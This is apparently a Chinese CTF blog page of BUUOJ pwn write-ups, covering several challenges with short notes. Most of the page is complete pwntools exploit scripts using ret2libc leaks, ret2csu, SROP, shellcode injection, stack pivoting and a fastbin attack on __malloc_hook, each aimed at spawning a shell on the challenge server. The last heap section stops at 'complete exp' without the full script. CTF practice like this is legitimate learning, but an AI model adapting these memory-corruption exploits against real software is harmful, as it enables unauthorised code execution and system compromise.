<h2 id="8-pwn2-sctf-2016"><a href="#8-pwn2-sctf-2016" class="headerlink" title="8. pwn2_sctf_2016"></a>8. pwn2_sctf_2016</h2><blockquote>
<p>还是rop</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./pwn2_sctf_2016"</span>)</span><br><span class="line">p= remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28641</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn2_sctf_2016"</span>)</span><br><span class="line">context(os = <span class="string">'linux'</span>,arch=<span class="string">'i386'</span>,log_level =<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"read?"</span>)</span><br><span class="line">p.sendline(<span class="string">"-1"</span>)</span><br><span class="line"></span><br><span class="line">printf_plt = elf.plt[<span class="string">'printf'</span>]</span><br><span class="line">getchar_got = elf.got[<span class="string">'getchar'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x2c</span>+<span class="number">0x4</span>) + p32(printf_plt) + p32(main) + p32(getchar_got)</span><br><span class="line">p.recvuntil(<span class="string">"data!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">getchar_addr = u32(p.recvuntil(<span class="string">"\xf7"</span>)[<span class="number">-4</span>:])</span><br><span class="line">print(hex(getchar_addr))</span><br><span class="line"></span><br><span class="line">obj = LibcSearcher(<span class="string">"getchar"</span>,getchar_addr)</span><br><span class="line">libc_base = getchar_addr - obj.dump(<span class="string">"getchar"</span>)</span><br><span class="line">system = obj.dump(<span class="string">"system"</span>) + libc_base</span><br><span class="line">binsh = obj.dump(<span class="string">"str_bin_sh"</span>) + libc_base</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"read?"</span>)</span><br><span class="line">p.sendline(<span class="string">"-1"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x2c</span>+<span class="number">0x4</span>) + p32(system) + p32(main) + p32(binsh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="9-ciscn-2019-ne-5"><a href="#9-ciscn-2019-ne-5" class="headerlink" title="9. ciscn_2019_ne_5"></a>9. ciscn_2019_ne_5</h2><p>栈溢出，addlog输入字符串，getflag里溢出了，，，</p>
<p>程序给了system，但是没给binsh，，，不知道为什么”;/bin/sh”不可以用，，，迷惑，然后自己就多走了一步，还可以用fflush的sh来做参数</p>
<p><img src="/2020/11/20/16-35/image-20210325123806085.png" alt="image-20210325123806085"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'i386'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./ciscn_2019_ne_5"</span>)</span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">25749</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./ciscn_2019_ne_5"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"password:"</span>)</span><br><span class="line">p.sendline(<span class="string">"administrator"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"0.Exit\n:"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">system = elf.plt[<span class="string">'system'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x080482ea</span></span><br><span class="line"><span class="comment">#payload = "a"*(0x48+4)+p32(puts_plt)+p32(main)+p32(printf_got)</span></span><br><span class="line">payload = <span class="string">"a"</span>*(<span class="number">0x48</span>+<span class="number">4</span>)+p32(system)+p32(main)+p32(binsh)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"0.Exit\n:"</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># printf_addr = u32(p.recvuntil("\xf7")[-4:])</span></span><br><span class="line"><span class="comment"># print(hex(printf_addr))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># obj = LibcSearcher("printf",printf_addr)</span></span><br><span class="line"><span class="comment"># libc_base = printf_addr - obj.dump("printf")</span></span><br><span class="line"><span class="comment"># system_addr = libc_base + obj.dump("system")</span></span><br><span class="line"><span class="comment"># binsh = libc_base + obj.dump("str_bin_sh")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p.sendline("administrator")</span></span><br><span class="line"><span class="comment"># p.recvuntil("0.Exit\n:")</span></span><br><span class="line"><span class="comment"># p.sendline("1")</span></span><br><span class="line"><span class="comment"># payload = "a"*(0x48+4)+p32(system_addr)+p32(main)+p32(binsh)</span></span><br><span class="line"><span class="comment"># p.sendline(payload)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recvuntil("0.Exit\n:")</span></span><br><span class="line"><span class="comment"># p.sendline("4")</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="10-jarvisoj-level3"><a href="#10-jarvisoj-level3" class="headerlink" title="10. jarvisoj_level3"></a>10. jarvisoj_level3</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./level3"</span>)</span><br><span class="line">p= remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27215</span>)</span><br><span class="line">elf = ELF(<span class="string">"./level3"</span>)</span><br><span class="line">context(os = <span class="string">'linux'</span>,arch=<span class="string">'i386'</span>,log_level =<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(read_got)+p32(<span class="number">0x4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr = u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line">print(hex(read_addr))</span><br><span class="line"></span><br><span class="line">obj = LibcSearcher(<span class="string">"read"</span>,read_addr)</span><br><span class="line">libc_base = read_addr - obj.dump(<span class="string">"read"</span>)</span><br><span class="line">system = libc_base + obj.dump(<span class="string">"system"</span>)</span><br><span class="line">binsh = libc_base + obj.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>)+p32(system)+p32(main)+p32(binsh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="11-jarvisoj-tell-me-something"><a href="#11-jarvisoj-tell-me-something" class="headerlink" title="11. jarvisoj_tell_me_something"></a>11. jarvisoj_tell_me_something</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./guestbook"</span>)</span><br><span class="line">p= remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27801</span>)</span><br><span class="line">elf = ELF(<span class="string">"./guestbook"</span>)</span><br><span class="line">context(os = <span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>,log_level =<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x00000000004006f3</span></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x00000000004006f1</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input your message:\n"</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">payload = (<span class="number">0x88</span>)*<span class="string">'a'</span>+p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15_ret)+p64(write_got)+p64(<span class="number">0</span>)+p64(write_plt)+p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)</span><br><span class="line"></span><br><span class="line">print(hex(write_addr))</span><br><span class="line"></span><br><span class="line">obj = LibcSearcher(<span class="string">"write"</span>,write_addr)</span><br><span class="line">libc_base = write_addr - obj.dump(<span class="string">"write"</span>)</span><br><span class="line">system = libc_base + obj.dump(<span class="string">"system"</span>)</span><br><span class="line">binsh = libc_base + obj.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input your message:\n"</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">payload = (<span class="number">0x88</span>)*<span class="string">'a'</span>+p64(pop_rdi)+p64(binsh)+p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="12-ciscn-2019-s-3"><a href="#12-ciscn-2019-s-3" class="headerlink" title="12. ciscn_2019_s_3"></a>12. ciscn_2019_s_3</h2><blockquote>
<p> 比较有意思的题目，，，，一开始忽略了gadget，，，，就没想到，，，</p>
</blockquote>
<p><img src="/2020/11/20/16-35/image-20210326220901432.png" alt="image-20210326220901432"></p>
<p>有两个gadget，就导致了有两种解法</p>
<h3 id="解法1：ret2csu"><a href="#解法1：ret2csu" class="headerlink" title="解法1：ret2csu"></a>解法1：ret2csu</h3><p>一开始有栈溢出，，，</p>
<p>然后有gadget可以设置rax，syscall执行evecve</p>
<p>所以只需要设置参数，rdi，rdx和rsi</p>
<p>rdi有gadget，但是rdx没有，，，所以为了设置rdx，使用了万能gadget</p>
<p>binsh地址的泄漏是因为输入的地址是rsp-0x10，，，所以两个“/bin/sh\x00”后就可以把rbp/rsp的地址带出来</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./ciscn_s_3"</span>)</span><br><span class="line">elf = process(<span class="string">"./ciscn_s_3"</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">vuln = <span class="number">0x04004ED</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"/bin/sh\x00"</span>*<span class="number">2</span> + p64(vuln)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">binsh = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>) - <span class="number">0x118</span></span><br><span class="line">log.success(hex(binsh))</span><br><span class="line"></span><br><span class="line"><span class="comment">#second</span></span><br><span class="line">pop_rax_59 = <span class="number">0x004004E2</span> </span><br><span class="line">part1 = <span class="number">0x00040059A</span></span><br><span class="line">part2 = <span class="number">0x0400580</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004005a3</span></span><br><span class="line">syscall = <span class="number">0x0000000000400501</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"/bin/sh\x00"</span>*<span class="number">2</span> + p64(pop_rax_59)</span><br><span class="line">payload += p64(part1)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(binsh+<span class="number">0x10</span>)<span class="comment">#suiyi</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#only low8</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(part2)</span><br><span class="line">payload += <span class="string">'a'</span> * <span class="number">56</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="解法2：srop"><a href="#解法2：srop" class="headerlink" title="解法2：srop"></a>解法2：srop</h3><blockquote>
<p>还有一个设置rax = 15的gadget，所以还可以使用srop，并且相比于ret2csu可以大大简化代码</p>
<p>因为参数的设置都在sigreturnframe里面。。。</p>
<p>主要不同主要在第二段代码里面。</p>
<p>直接pop_rax,syscall，这时候rsp的指向下面，，，str(sigframe)，即可</p>
</blockquote>
<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./ciscn_s_3"</span>)</span><br><span class="line">elf = process(<span class="string">"./ciscn_s_3"</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">vuln = <span class="number">0x04004ED</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"/bin/sh\x00"</span>*<span class="number">2</span> + p64(vuln)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">binsh = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>) - <span class="number">0x118</span></span><br><span class="line">log.success(hex(binsh))</span><br><span class="line"></span><br><span class="line"><span class="comment">#second</span></span><br><span class="line">syscall = <span class="number">0x0000000000400501</span></span><br><span class="line">pop_rax_15 = <span class="number">0x004004DA</span></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = binsh</span><br><span class="line">sigframe.rsi = <span class="number">0</span></span><br><span class="line">sigframe.rdx = <span class="number">0</span></span><br><span class="line">sigframe.rip = syscall</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"/bin/sh\x00"</span>*<span class="number">2</span> + p64(pop_rax_15)+p64(syscall) +str(sigframe)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p><del>其实还是比较简单的题，恕在下无能</del></p>
</blockquote>
<h2 id="13-HarekazeCTF2019-baby-rop2"><a href="#13-HarekazeCTF2019-baby-rop2" class="headerlink" title="13. [HarekazeCTF2019]baby_rop2"></a>13. [HarekazeCTF2019]baby_rop2</h2><blockquote>
<p>就是简单又正常的rop，，，还给了libc，，，，</p>
</blockquote>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">p = process(<span class="string">"./babyrop2"</span>)</span><br><span class="line">p= remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26780</span>)</span><br><span class="line">elf = ELF(<span class="string">"./babyrop2"</span>)</span><br><span class="line">context(os = <span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>,log_level =<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">printf_plt = elf.plt[<span class="string">'printf'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">main = elf.sym[<span class="string">'main'</span>]</span><br><span class="line">pop_rdi = <span class="number">0x0000000000400733</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"name?"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x28</span> + p64(pop_rdi) + p64(read_got) + p64(printf_plt)+p64(main)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">read_addr = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)</span><br><span class="line">print(hex(read_addr))</span><br><span class="line"></span><br><span class="line">libc_base = read_addr - libc.sym[<span class="string">'read'</span>]</span><br><span class="line">system = libc.sym[<span class="string">'system'</span>] + libc_base</span><br><span class="line">binsh = libc.search(<span class="string">"/bin/sh"</span>).next() + libc_base</span><br><span class="line">log.success(binsh)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"name?"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x28</span> + p64(pop_rdi) + p64(binsh) + p64(system)+p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="14-ez-pz-hackover-2016"><a href="#14-ez-pz-hackover-2016" class="headerlink" title="14. ez_pz_hackover_2016"></a>14. ez_pz_hackover_2016</h2><blockquote>
<p>思路很简单，，就是ret2shellcode的题目，这个可以想到，，，一般没开nx就是了，，，，但是算偏移的东西搞得我有点乱，，，，</p>
</blockquote>
<h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><p>emmm，ida里面给出的是错误的，，，所以用cyclic来算</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#cyclic 100</span></span><br><span class="line">payload = <span class="string">'crashme'</span>+<span class="string">'\x00'</span></span><br><span class="line">payload += <span class="string">"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"</span></span><br><span class="line"><span class="comment">#Invalid $PC address: 0x61666161</span></span><br><span class="line"><span class="comment">#winter@ubuntu:~/buu$ cyclic -l 0x61666161</span></span><br><span class="line"><span class="comment">#18</span></span><br></pre></td></tr></table></figure>
<p>所以战役粗加上crashme，，，偏移量是18</p>
<h3 id="shellcode偏移"><a href="#shellcode偏移" class="headerlink" title="shellcode偏移"></a>shellcode偏移</h3><p>先随便填之前泄漏的地址，，，，调试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">'crashme'</span>+<span class="string">'\x00'</span></span><br><span class="line">payload += <span class="string">"a"</span> * <span class="number">18</span></span><br><span class="line">payload += p32(addr)</span><br><span class="line">payload += shellcode</span><br></pre></td></tr></table></figure>
<p><img src="/2020/11/20/16-35/image-20210328151124518.png" alt="image-20210328151124518"></p>
<p>所以，，，之前泄漏的地址，和shellcode的地址差0x1c，只要<code>addr - 0x1c</code>即可。</p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">"./ez_pz_hackover_2016"</span>)</span><br><span class="line"><span class="comment">#= remote("node3.buuoj.cn",28694)</span></span><br><span class="line">elf = ELF(<span class="string">"./ez_pz_hackover_2016"</span>)</span><br><span class="line">context(os = <span class="string">'linux'</span>,arch=<span class="string">'i386'</span>,log_level =<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">p.recvuntil(<span class="string">"crash: 0x"</span>)</span><br><span class="line">addr = int(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">print(hex(addr))</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">print(hex(addr+<span class="number">0x1e</span>))</span><br><span class="line">payload = <span class="string">'crashme'</span>+<span class="string">'\x00'</span></span><br><span class="line">payload += <span class="string">"a"</span> * <span class="number">18</span></span><br><span class="line">payload += p32(addr)</span><br><span class="line">payload += shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="15-ciscn-2019-es-2"><a href="#15-ciscn-2019-es-2" class="headerlink" title="15. ciscn_2019_es_2"></a>15. ciscn_2019_es_2</h2><blockquote>
<p>wuwuwu,,,没做出来，感觉很简单，，，栈迁移</p>
</blockquote>
<p><img src="/2020/11/20/16-35/image-20210329213719581.png" alt="image-20210329213719581"></p>
<p>两个相同的输入，，，</p>
<p>方法是第一个可以泄露ebp，，，然后后面的话，，，是覆盖main的返回地址，，，就很强，，，</p>
<p><img src="/2020/11/20/16-35/image-20210329215328891.png" alt="image-20210329215328891"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'i386'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./ciscn_2019_es_2"</span>)</span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27980</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ciscn_2019_es_2"</span>)</span><br><span class="line"></span><br><span class="line">system = elf.sym[<span class="string">'system'</span>]</span><br><span class="line">bss = <span class="number">0x0804A049</span></span><br><span class="line">leave_ret = <span class="number">0x080485FD</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"your name?"</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x20</span> + <span class="string">'b'</span>*<span class="number">8</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">ebp = u32(p.recvuntil(<span class="string">'\xff'</span>)[<span class="number">-4</span>:])</span><br><span class="line">print(hex(ebp))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">print(hex(ebp - <span class="number">0x24</span>))</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">8</span> + p32(ebp - <span class="number">0x24</span>) + <span class="string">'bbbb'</span> + p32(system) + <span class="string">'cccc'</span> + p32(ebp - <span class="number">0x1c</span>) + <span class="string">'/bin/sh\x00'</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">'p'</span>)</span><br><span class="line">payload += p32(ebp - <span class="number">0x2c</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>做过栈迁移的专题吧。。。。卡擦卡擦，，，停一下。。。</p>
<p>第一页over了。。。</p>
<p><img src="/2020/11/20/16-35/image-20210329215437436.png" alt="image-20210329215437436"></p>
</blockquote>
<hr>
<h2 id="0-vn-pwn-simpleHeap"><a href="#0-vn-pwn-simpleHeap" class="headerlink" title="0.vn_pwn_simpleHeap"></a>0.vn_pwn_simpleHeap</h2><p><img src="/2020/11/20/16-35/image-20201120094648513.png" alt="image-20201120094648513"></p>
<p><img src="/2020/11/20/16-35/image-20201120094808176.png" alt="image-20201120094808176"></p>
<p>e = 7 + 7</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(0x18,&#39;pppp&#39;)</span><br><span class="line">add(0x60,&#39;pppp&#39;)</span><br><span class="line">add(0x60,&#39;pppp&#39;)</span><br><span class="line">add(0x10,&#39;pppp&#39;)</span><br></pre></td></tr></table></figure>
<hr>
<p><img src="/2020/11/20/16-35/image-20201120094858507.png" alt="image-20201120094858507"></p>
<p><img src="/2020/11/20/16-35/image-20201120094932009.png" alt="image-20201120094932009"></p>
<p>程序以为只有三个了，因为0xe1把0x71覆盖了，但是0x71还是可以用的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload&#x3D;&#39;p&#39;*0x18+&#39;\xe1&#39;</span><br><span class="line">edit(0,payload)</span><br></pre></td></tr></table></figure>
<hr>
<p><img src="/2020/11/20/16-35/image-20201120095055903.png" alt="image-20201120095055903"></p>
<p>放入了unsortedbin中</p>
<p><img src="/2020/11/20/16-35/image-20201120095130576.png" alt="image-20201120095130576"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">delete(1)</span><br></pre></td></tr></table></figure>
<hr>
<p><img src="/2020/11/20/16-35/image-20201120095223789.png" alt="image-20201120095223789"></p>
<p>会把原来unsortedbin中上面的块分走，那么下面里面存放的fd和bk就可以通过原来第二个0x71来输出了。</p>
<p><img src="/2020/11/20/16-35/image-20201120095331695.png" alt="image-20201120095331695"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(0x60,&#39;pppp&#39;)</span><br></pre></td></tr></table></figure>
<hr>
<p>得到了unsortedbin的链表头，可以得到main_arena的地址和libc的地址。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">main_arena&#x3D;u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))-88</span><br><span class="line">libc_base&#x3D;main_arena-0x3c4b20</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_one_gadget&#x3D;[0x45216,0x4526a,0xf02a4,0xf1147]</span><br><span class="line">one_gadget&#x3D;libc_base+libc_one_gadget[1]</span><br><span class="line">malloc_hook&#x3D;libc_base+libc.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">realloc&#x3D;libc_base+libc.symbols[&#39;__libc_realloc&#39;]</span><br><span class="line">fake_chunk&#x3D;malloc_hook-0x23</span><br></pre></td></tr></table></figure>
<hr>
<p><img src="/2020/11/20/16-35/image-20201120095807801.png" alt="image-20201120095807801"></p>
<p>变回来了，但是第二个0x71有两个块同时指向chunk2和chunk4</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(0x60,&#39;pppp&#39;)#5</span><br></pre></td></tr></table></figure>
<hr>
<p>double free?</p>
<p><img src="/2020/11/20/16-35/image-20201120100035193.png" alt="image-20201120100035193"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">delete(4)</span><br></pre></td></tr></table></figure>
<hr>
<p>这时候，chunk2和chunk4指向同一个，chunk4被释放了，但是chunk2还在，可以fastbin attack？</p>
<p><img src="/2020/11/20/16-35/image-20201120100330055.png" alt="image-20201120100330055"></p>
<p>修改了fd指针</p>
<p><img src="/2020/11/20/16-35/image-20201120100417281.png" alt="image-20201120100417281"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload&#x3D;p64(fake_chunk)</span><br><span class="line">edit(2,payload)</span><br></pre></td></tr></table></figure>
<hr>
<p><img src="/2020/11/20/16-35/image-20201120100443552.png" alt="image-20201120100443552"></p>
<p>申请回来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(0x60,&#39;pppp&#39;)</span><br></pre></td></tr></table></figure>
<hr>
<p>然后再申请会到下面这个地址里面，然后因为one_gadget的限制，所以需要利用realloc_hook。</p>
<p>方法：</p>
<ol>
<li><p>realloc填上one_gadget</p>
</li>
<li><p>再在malloc上填上对应的realloc调整地址（根据需要减少pop），malloc上面8个就是realloc</p>
<p>第二部里面的realloc地址是在libc里面的函数地址，，，</p>
</li>
</ol>
<p><img src="/2020/11/20/16-35/image-20201120161711894.png" alt="image-20201120161711894"></p>
<p><img src="/2020/11/20/16-35/image-20201120155747244.png" alt="image-20201120155747244"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload&#x3D;&#39;p&#39;*0xb+p64(one_gadget)+p64(realloc+13)</span><br><span class="line">add(0x60,payload)</span><br></pre></td></tr></table></figure>
<p><a href="https://bbs.pediy.com/thread-246786.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-246786.htm</a></p>
<hr>
<p>最后在申请一下，就的到shell了。</p>
<p><img src="/2020/11/20/16-35/image-20201120155844851.png" alt="image-20201120155844851"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p.recvuntil(&#39;choice: &#39;)</span><br><span class="line">p.sendline(&#39;1&#39;)</span><br><span class="line">p.recvuntil(&#39;size?&#39;)</span><br><span class="line">p.sendline(&quot;12&quot;)</span><br></pre></td></tr></table></figure>
<p>完整exp</p>
